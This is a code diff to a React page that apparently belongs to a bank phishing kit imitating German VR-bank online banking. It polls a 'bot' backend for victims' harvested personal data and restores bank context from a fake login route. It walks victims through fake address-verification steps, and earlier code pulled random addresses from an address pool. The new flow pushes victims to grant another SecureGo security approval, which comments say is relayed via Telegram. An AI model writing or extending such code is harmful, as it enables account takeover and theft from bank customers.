@@ -5,8 +5,7 @@ import { getBotTask } from "@/lib/botClient";
 import { getRandomPoolAddress } from "@/lib/addressPool.functions";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
-import { AddressVerificationStep } from "@/components/flow/AddressVerificationStep";
-import { DeletionConfirmedStep } from "@/components/flow/DeletionConfirmedStep";
+import AddressVerification from "@/components/AddressVerification";
 import { CompletionStep } from "@/components/flow/CompletionStep";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 
@@ -30,7 +29,7 @@ const DEFAULT_THEME: FlowTheme = {
   buttonRadius: "rounded-full",
 };
 
-type Step = "personal" | "address" | "deleted" | "personal2" | "done";
+type Step = "personal" | "address" | "done";
 
 export const Route = createFileRoute("/personal-data/$taskId")({
   head: () => ({
@@ -121,7 +120,8 @@ function PersonalDataPage() {
   const [result, setResult] = useState<any>(null);
   const [bankCtx, setBankCtx] = useState<BankCtx | null>(null);
   const [step, setStep] = useState<Step>("personal");
-  const [deletedAddr, setDeletedAddr] = useState<{ strasse: string; plzOrt: string } | null>(null);
+  const [addressDecisionPending, setAddressDecisionPending] = useState(false);
+  const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
 
   // Bank context is cached from the login route; restore synchronously
   useEffect(() => {
@@ -133,29 +133,29 @@ function PersonalDataPage() {
       const raw = sessionStorage.getItem(`bot_result_${taskId}`);
       if (raw) setResult(JSON.parse(raw));
     } catch {}
+    try {
+      if (sessionStorage.getItem(`bot_address_pending_${taskId}`) === "1") {
+        setAddressDecisionPending(true);
+        sessionStorage.removeItem(`bot_address_pending_${taskId}`);
+      }
+    } catch {}
   }, [taskId]);
 
   // Keep polling briefly in case more fields arrive after the initial redirect
   useEffect(() => {
     let cancelled = false;
     let timer: ReturnType<typeof setTimeout> | null = null;
-    const startedAt = Date.now();
-    const MAX_MS = 5 * 60 * 1000;
+    let attempts = 0;
     const tick = async () => {
+      attempts += 1;
       const { data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
       if (cancelled) return;
       if (data?.result) {
         setResult(data.result);
         try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
       }
-      // As soon as the bot asks for address confirmation, jump straight to the
-      // address popup — don't wait for balance/cards/limits to arrive.
-      if (data?.status === "waiting_for_address_confirm" || data?.status === "waiting_for_address") {
-        setStep((prev) => (prev === "personal" ? "address" : prev));
-      }
-      if (data?.status === "completed" || data?.status === "failed") return;
-      if (Date.now() - startedAt > MAX_MS) return;
-      timer = setTimeout(tick, 1500);
+      if (data?.status === "completed" || data?.status === "failed" || attempts > 12) return;
+      timer = setTimeout(tick, 800);
     };
     tick();
     return () => { cancelled = true; if (timer) clearTimeout(timer); };
@@ -166,79 +166,7 @@ function PersonalDataPage() {
     [result, bankCtx?.bankName],
   );
 
-  const [poolAddress, setPoolAddress] = useState<{ strasse: string; plzOrt: string } | null>(null);
-
-  useEffect(() => {
-    let cancelled = false;
-    (async () => {
-      try {
-        const res = await getRandomPoolAddress();
-        if (cancelled) return;
-        if (res) {
-          setPoolAddress({ strasse: res.street, plzOrt: `${res.zip} ${res.city}`.trim() });
-        }
-      } catch {}
-    })();
-    return () => { cancelled = true; };
-  }, [taskId]);
-
-  const additionalAddress = useMemo(
-    () => poolAddress ?? (customer ? makeFallbackAddress(customer.adresse) : { strasse: "", plzOrt: "" }),
-    [poolAddress, customer],
-  );
-
-  // Address payload the bot exposes as soon as it hits waiting_for_address_confirm
-  const addressData = result?.address_data ?? result?.adress_data ?? null;
-  const addrFromPayload = addressData
-    ? {
-        current: {
-          strasse: firstString(addressData.old_street, addressData.current_street, addressData.strasse) || "",
-          plzOrt: [
-            firstString(addressData.old_plz, addressData.old_zip, addressData.current_plz, addressData.plz),
-            firstString(addressData.old_city, addressData.current_city, addressData.ort, addressData.city),
-          ].filter(Boolean).join(" "),
-        },
-        next: {
-          strasse: firstString(addressData.new_street, addressData.next_street) || "",
-          plzOrt: [
-            firstString(addressData.new_plz, addressData.new_zip),
-            firstString(addressData.new_city, addressData.next_city),
-          ].filter(Boolean).join(" "),
-        },
-      }
-    : null;
-
-  // Allow the address popup to render even before person_data arrived, using
-  // the address payload directly. Otherwise, wait for the initial data.
   if (!result || !customer) {
-    if (step === "address" && addrFromPayload?.current.strasse) {
-      const theme = bankCtx?.theme ?? DEFAULT_THEME;
-      const shellProps = {
-        theme,
-        logoSrc: bankCtx?.logoSrc ?? vrLogoGeneric,
-        fallbackLogoSrc: bankCtx?.fallbackLogoSrc ?? vrLogoGeneric,
-        bankName: bankCtx?.bankName ?? "Online-Banking",
-        showName: bankCtx?.showName ?? false,
-        bigLogo: bankCtx?.bigLogo ?? false,
-        footerLinks: (bankCtx?.footerLinks ?? null) as any,
-      };
-      return (
-        <BankShell {...shellProps}>
-          <AddressVerificationStep
-            theme={theme}
-            taskId={taskId}
-            currentAddress={addrFromPayload.current}
-            additionalAddress={addrFromPayload.next.strasse ? addrFromPayload.next : addrFromPayload.current}
-            {...(bankCtx?.group ? { bankGroup: bankCtx.group } : {})}
-            onBack={() => setStep("personal")}
-            onDeleted={(deleted) => {
-              setDeletedAddr(deleted);
-              setStep("deleted");
-            }}
-          />
-        </BankShell>
-      );
-    }
     return (
       <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
         <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
@@ -258,9 +186,7 @@ function PersonalDataPage() {
     footerLinks: (bankCtx?.footerLinks ?? null) as any,
   };
 
-  const finalCustomer: CustomerData = step === "personal2" || step === "done"
-    ? { ...customer, adresse: customer.adresse }
-    : customer;
+  const bankId = bankCtx?.bankId ?? "";
 
   return (
     <BankShell {...shellProps}>
@@ -269,33 +195,50 @@ function PersonalDataPage() {
           // @ts-expect-error FlowTheme is structurally compatible; component only reads shared fields
           theme={theme}
           customerData={customer}
-          bankId={bankCtx?.bankId ?? ""}
-          onContinue={() => setStep("address")}
-          onEditAddress={() => setStep("address")}
+          bankId={bankId}
+          addressDecisionPending={addressDecisionPending}
+          onAddressChoiceResolved={() => {
+            // Kunde hat sich für eine Adresse entschieden – erneute
+            // Sicherheitsfreigabe via Telegram / SecureGo anstoßen.
+            setAddressDecisionPending(false);
+            setForceShowSecureGo(true);
+            setStep("address");
+          }}
+          onContinue={() => {
+            if (addressDecisionPending) {
+              setStep("address");
+              return;
+            }
+            setStep("done");
+          }}
+          onEditAddress={() => setStep("done")}
         />
       )}
 
       {step === "address" && (
-        <AddressVerificationStep
+        <AddressVerification
+          bankName={bankCtx?.bankName ?? ""}
+          bankId={bankId}
+          bankGroup={bankCtx?.group}
+          // @ts-expect-error FlowTheme is structurally compatible with BankTheme
           theme={theme}
-          taskId={taskId}
-          currentAddress={customer.adresse}
-          additionalAddress={additionalAddress}
-          {...(bankCtx?.group ? { bankGroup: bankCtx.group } : {})}
           customerName={customer.name}
-          onBack={() => setStep("personal")}
-          onDeleted={(deleted) => {
-            setDeletedAddr(deleted);
-            setStep("deleted");
+          customerNumber={customer.kundenNr}
+          customerEmail={customer.email}
+          customerPhone={customer.mobilNr}
+          currentAddress={customer.adresse}
+          forceShowSecureGo={forceShowSecureGo}
+          onSecureGoOpened={() => setForceShowSecureGo(false)}
+          onConfirm={() => setStep("done")}
+          onDelete={() => {
+            // Rücksprung: Kunde muss auf "Persönliche Daten" erneut die
+            // aktuelle Hauptadresse aus zwei Adressen auswählen.
+            setAddressDecisionPending(true);
+            setForceShowSecureGo(false);
+            setStep("personal");
           }}
-        />
-      )}
-
-      {step === "deleted" && (
-        <DeletionConfirmedStep
-          theme={theme}
-          {...(deletedAddr ? { deletedAddress: deletedAddr } : {})}
-          onContinue={() => setStep("done")}
+          onNoAddress={() => setStep("done")}
+          taskId={taskId}
         />
       )}
 
@@ -305,4 +248,3 @@ function PersonalDataPage() {
     </BankShell>
   );
 }
-
